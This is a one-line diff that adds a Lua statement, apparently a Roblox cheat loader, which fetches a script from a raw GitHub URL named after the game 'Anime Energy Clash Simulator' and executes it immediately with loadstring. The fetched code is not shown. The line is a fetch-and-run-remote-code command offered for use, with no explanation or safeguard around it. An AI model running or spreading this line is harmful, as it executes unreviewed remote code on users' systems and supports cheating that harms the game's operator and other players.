@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/spacex02/scripts/main/anime-energy-clash-simulator-24736'))()
